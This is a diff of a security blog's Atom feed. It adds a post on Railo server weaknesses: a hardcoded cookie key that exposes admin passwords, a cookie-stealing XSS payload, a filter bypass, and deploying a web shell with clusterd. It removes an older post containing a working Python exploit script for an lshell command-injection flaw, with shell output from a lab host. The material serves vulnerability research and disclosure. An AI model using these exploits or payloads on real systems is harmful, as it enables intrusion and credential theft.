@@ -4,7 +4,7 @@
   <title><![CDATA[forelsec]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-06-24T21:45:23-06:00</updated>
+  <updated>2014-06-25T23:59:44-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,276 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[railo security - part one - intro]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/"/>
+    <updated>2014-06-25T15:00:00-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one</id>
+    <content type="html"><![CDATA[<p><em>Part one &ndash; intro</em><br/>
+<em>Part two</em><br/>
+<em>Part three</em><br/>
+<em>Part four</em></p>
+
+<p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>
+
+<p>I&rsquo;ll preface this post with a quick rundown on what we&rsquo;re working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on <a href="github.com/getrailo/railo">Github</a>; much of this post&rsquo;s code samples have been taken from the 4.2 branch or the master.  Hashes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ git branch
+</span><span class='line'>* master
+</span><span class='line'>$ git rev-parse master
+</span><span class='line'>694e8acf1a762431eab084da762a0abbe5290f49</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And a quick rundown of the code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cloc ./
+</span><span class='line'>    3689 text files.
+</span><span class='line'>    3571 unique files.                                          
+</span><span class='line'>     151 files ignored.
+</span><span class='line'>
+</span><span class='line'>http://cloc.sourceforge.net v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)
+</span><span class='line'>---------------------------------------------------------------------------------
+</span><span class='line'>Language                       files          blank        comment           code
+</span><span class='line'>---------------------------------------------------------------------------------
+</span><span class='line'>Java                            2786          66639          69647         258015
+</span><span class='line'>ColdFusion                       315           5690           3089          35890
+</span><span class='line'>ColdFusion CFScript              352           4377            643          15856
+</span><span class='line'>XML                               22            526            563           5773
+</span><span class='line'>Javascript                        14             46            252            733
+</span><span class='line'>Ant                                4             38             70            176
+</span><span class='line'>DTD                                4            283            588            131
+</span><span class='line'>CSS                                5             52             16             77
+</span><span class='line'>HTML                               1              0              0              1
+</span><span class='line'>---------------------------------------------------------------------------------
+</span><span class='line'>SUM:                            3503          77651          74868         316652
+</span><span class='line'>---------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at <code>http://localhost:8888/railo-context/admin/server.cfm</code> and web is available at <code>http://localhost:8888/railo-context/admin/web.cfm</code>.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.</p>
+
+<h4>Authentication</h4>
+
+<p>As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (<code>web.cfm</code>):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause&gt;
+</span><span class='line'>        &lt;cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#"&gt;
+</span><span class='line'>    &lt;cfelse&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A <code>Remember Me For</code> setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user&rsquo;s password and stores it as the authentication cookie.  Here&rsquo;s the implementation of this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&ad],cookieKey,"CFMX_COMPAT","hex")#"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s right; a static key, defined as <code>&lt;cfset cookieKey="sdfsdf789sdfsd"&gt;</code>, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user&rsquo;s password client-side.  This is akin to simply base64&#8217;ing the password, as symmetric key security is dependant upon the secrecy of this shared key.</p>
+
+<p>To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')&gt;
+</span><span class='line'>    &lt;cfset fromCookie=true&gt;
+</span><span class='line'>    &lt;cftry&gt;
+</span><span class='line'>        &lt;cfset session["password"&ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")&gt;
+</span><span class='line'>        &lt;cfcatch&gt;&lt;/cfcatch&gt;
+</span><span class='line'>    &lt;/cftry&gt;
+</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For example, if my stored cookie was <code>RAILO_ADMIN_PW_WEB=6802AABFAA87A7</code>, we could decrypt this with a simple CFML page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")&gt;
+</span><span class='line'>&lt;cfdump var="#tmp#"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This would dump my plaintext password (which, in this case, is &ldquo;default&rdquo;).  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: <code>Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT</code>._</p>
+
+<p>Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset session["password"&request.adminType]=form["login_password"&request.adminType]&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to dump this, however, we&rsquo;d need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I&rsquo;ve placed a short CFM file on the host and set the error handler to invoke it.  <code>test.cfm</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfdump var="#session#"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We then set the template handler to this file:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-error-handler.jpg"></p>
+
+<p>If we now hit a non-existent page, <code>/railo-context/xx.cfm</code> for example, we&rsquo;ll trigger the cfm and get our plaintext password:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-session-plaintext.jpg"></p>
+
+<h4>XSS</h4>
+
+<p>XSS is now awesome, because we can fetch the server&rsquo;s plaintext password.  Is there XSS in Railo?</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss.jpg"></p>
+
+<p>Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.</p>
+
+<p>Post-authentication search:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss2.jpg"></p>
+
+<p>Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting <code>"&gt;&lt;/form&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> will, of course, pop-up the cookie.</p>
+
+<p>How about stored XSS?</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-xss3.jpg"></p>
+
+<p>A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.</p>
+
+<p>Speaking of, let&rsquo;s take a quick look at the sanitization routines.  They&rsquo;ve implemented their own routines inside of <code>ScriptProtect.java</code>, and it&rsquo;s a very simple blacklist:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  public static final String[] invalids=new String[]{
+</span><span class='line'>        "object", "embed", "script", "applet", "meta", "iframe"
+</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They iterate over these values and perform a simple compare, and if a <em>bad</em> tag is found, they simply replace it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if(compareTagName(tagName)) {
+</span><span class='line'>            if(sb==null) {
+</span><span class='line'>                sb=new StringBuffer();
+</span><span class='line'>                last=0;
+</span><span class='line'>            }
+</span><span class='line'>            sb.append(str.substring(last,index+1));
+</span><span class='line'>            sb.append("invalidTag");
+</span><span class='line'>            last=endIndex;
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It doesn&rsquo;t take much to evade this filter, as I&rsquo;ve already described.</p>
+
+<p>CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there&rsquo;s not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-server-pw.jpg"></p>
+
+<p>In the above image, if <code>Access Write</code> was configured to <code>open</code>, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.</p>
+
+<h4>Deploying</h4>
+
+<p>Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer task --usr-auth default
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
+</span><span class='line'>            [Supporting 6 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
+</span><span class='line'> [2014-05-01 10:04PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-05-01 10:04PM] Server hinted at 'railo'
+</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server...
+</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator...
+</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator...
+</span><span class='line'> [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
+</span><span class='line'> [2014-05-01 10:04PM]   Railo Server (version 4.1)
+</span><span class='line'> [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
+</span><span class='line'> [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
+</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting completed.
+</span><span class='line'> [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] &gt; 
+</span><span class='line'> [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
+</span><span class='line'> [2014-05-01 10:04PM] Creating scheduled task...
+</span><span class='line'> [2014-05-01 10:04PM] Task cmd.cfml created, invoking...
+</span><span class='line'> [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
+</span><span class='line'> [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
+</span><span class='line'> [2014-05-01 10:04PM] Cleaning up...
+</span><span class='line'> [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This works almost identically to the Coldfusion scheduler, and should not be surprising.</p>
+
+<p>One feature Railo has that isn&rsquo;t found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don&rsquo;t need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.</p>
+
+<p>Railo allows extensions to be uploaded directly to the server, found here:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-plugin-upload.jpg"></p>
+
+<p>Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.</p>
+
+<p>That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[rce in browser exploitation framework (BeEF)]]></title>
@@ -5403,239 +5673,6 @@ It&rsquo;s also of interest that none of this code verifies the authenticity of 
 
 
 <p>And flag was waiting for us in <code>/tmp/flagged</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[lshell 0.9.15 pathing vulnerability]]></title>
-    <link href="http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability/"/>
-    <updated>2012-12-30T22:43:42-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability</id>
-    <content type="html"><![CDATA[<p>While working through Kioptrix level 4, I stumbled into <a href="https://github.com/ghantoos/lshell">lshell</a>, a limited shell environment developed in Python.  I don&rsquo;t want to walk through the vulnerability again, but at a high level versions &lt;= 0.9.15 are vulnerable to an unsanitized eval() call with user supplied input.  I couldn&rsquo;t find a working PoC, so I wrote one.</p>
-
-<p>This will verify the install and spawn a pseudo-shell for running commands on the remote host.  While it may be more beneficial to just log in and run the exploit to spawn /bin/bash, this is a nice hacky way to quickly enumerate and tool around on the back end:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/kioptrix_l4# python lshell_remote.py john ****** 192.168.1.39
-</span><span class='line'>[!] .............................
-</span><span class='line'>[!] lshell &lt;= 0.9.15 remote shell.
-</span><span class='line'>[!] note: you can also ssh in and execute '/bin/bash'
-</span><span class='line'>[!] .............................
-</span><span class='line'>[!] Checking host 192.168.1.39...
-</span><span class='line'>[+] vulnerable lshell found, preparing pseudo-shell...
-</span><span class='line'>$ id
-</span><span class='line'>uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
-</span><span class='line'>$ ls -l
-</span><span class='line'>total 48
-</span><span class='line'>-rwxr-xr-x 1 john john  1544 2009-01-20 19:51 install.sh
-</span><span class='line'>-rw-r--r-- 1 john john  7715 2009-01-20 19:06 lib_mysqludf_sys.c
-</span><span class='line'>-rw-r--r-- 1 john john  9934 2009-01-21 19:42 lib_mysqludf_sys.html
-</span><span class='line'>-rwxr-xr-x 1 john john 12896 2009-01-19 04:11 lib_mysqludf_sys.so
-</span><span class='line'>-rw-r--r-- 1 john john  1647 2009-01-21 19:43 lib_mysqludf_sys.sql
-</span><span class='line'>-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
-</span><span class='line'>$ ls -l | grep 'Makefile'
-</span><span class='line'>-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
-</span><span class='line'>$ exit
-</span><span class='line'>root@bt:~/kioptrix_l4#</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can run pretty much everything except for binary files; this is because of the shell environment changing. I wasn&rsquo;t able to figure out a clean way to attach a TTY to the stdin/stdout/stderr, so if anyone knows of a way to do this with Paramiko, drop me a message.  I&rsquo;ll take any bug reports as well.  This requires Paramiko libraries to be installed; tested with Python 2.7.x.</p>
-
-<p><a href="http://pastebin.com/r7LCdeTC">Pastebin</a> link for download and code:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import paramiko
-</span><span class='line'>import traceback
-</span><span class='line'>from time import sleep
-</span><span class='line'>
-</span><span class='line'>#
-</span><span class='line'># Exploit lshell pathing vulnerability in &lt;= 0.9.15.
-</span><span class='line'># Runs commands on the remote system.
-</span><span class='line'># @dronesec
-</span><span class='line'>#
-</span><span class='line'>
-</span><span class='line'>if len(sys.argv) &lt; 4:
-</span><span class='line'>    print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
-</span><span class='line'>    sys.exit(1)
-</span><span class='line'>
-</span><span class='line'>try:
-</span><span class='line'>    print '[!] .............................'
-</span><span class='line'>    print '[!] lshell &lt;= 0.9.15 remote shell.'
-</span><span class='line'>    print '[!] note: you can also ssh in and execute \'/bin/bash\''
-</span><span class='line'>    print '[!] .............................'
-</span><span class='line'>    print '[!] Checking host %s...'%(sys.argv[3])
-</span><span class='line'>    ssh = paramiko.SSHClient()
-</span><span class='line'>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-</span><span class='line'>    if len(sys.argv) == 5:
-</span><span class='line'>        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
-</span><span class='line'>    else:
-</span><span class='line'>        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>    # verify lshell 
-</span><span class='line'>    channel = ssh.invoke_shell()
-</span><span class='line'>    while not channel.recv_ready(): sleep(1)
-</span><span class='line'>    ret = channel.recv(2048)
-</span><span class='line'>
-</span><span class='line'>    channel.send('help help\n')
-</span><span class='line'>    while not channel.recv_ready(): sleep(1)
-</span><span class='line'>    ret = channel.recv(2048)
-</span><span class='line'>
-</span><span class='line'>    if not 'lshell' in ret:
-</span><span class='line'>        if 'forbidden' in ret:
-</span><span class='line'>            print '[-] Looks like we can\'t execute SSH commands'
-</span><span class='line'>        else:
-</span><span class='line'>            print '[-] Environment is not lshell'
-</span><span class='line'>        sys.exit(1)
-</span><span class='line'>
-</span><span class='line'>    # verify vulnerable version
-</span><span class='line'>    channel.send('sudo\n')
-</span><span class='line'>    while not channel.recv_ready(): sleep(1)
-</span><span class='line'>    ret = channel.recv(2048)
-</span><span class='line'>    if not 'Traceback' in ret:
-</span><span class='line'>        print '[-] lshell version not vulnerable.'
-</span><span class='line'>        sys.exit(1)
-</span><span class='line'>    channel.close()
-</span><span class='line'>    ssh.close()
-</span><span class='line'>
-</span><span class='line'>    # exec shell
-</span><span class='line'>    print '[+] vulnerable lshell found, preparing pseudo-shell...'
-</span><span class='line'>    if len(sys.argv) == 5:
-</span><span class='line'>        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
-</span><span class='line'>    else:
-</span><span class='line'>        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
-</span><span class='line'>
-</span><span class='line'>    while True:
-</span><span class='line'>        cmd = raw_input('$ ')
-</span><span class='line'>
-</span><span class='line'>        # breaks paramiko
-</span><span class='line'>        if cmd[0] is '/':
-</span><span class='line'>            print '[!] Running binaries won\'t work!'
-</span><span class='line'>            continue
-</span><span class='line'>
-</span><span class='line'>        cmd = cmd.replace("'", r"\'")
-</span><span class='line'>        cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
-</span><span class='line'>        if len(cmd) &gt; 1:
-</span><span class='line'>            if 'quit' in cmd or 'exit' in cmd:
-</span><span class='line'>                break
-</span><span class='line'>            (stdin,stdout,stderr) = ssh.exec_command(cmd)
-</span><span class='line'>        out = stdout.read()
-</span><span class='line'>        print out.strip()
-</span><span class='line'>except paramiko.AuthenticationException:
-</span><span class='line'>    print '[-] Authentication to %s failed.'%sys.argv[3]
-</span><span class='line'>except Exception, e:
-</span><span class='line'>    print '[-] Error: ', e
-</span><span class='line'>    print type(e)
-</span><span class='line'>    traceback.print_exc(file=sys.stdout)
-</span><span class='line'>finally:
-</span><span class='line'>    channel.close()
-</span><span class='line'>    ssh.close()</span></code></pre></td></tr></table></div></figure>
-
 ]]></content>
   </entry>
   
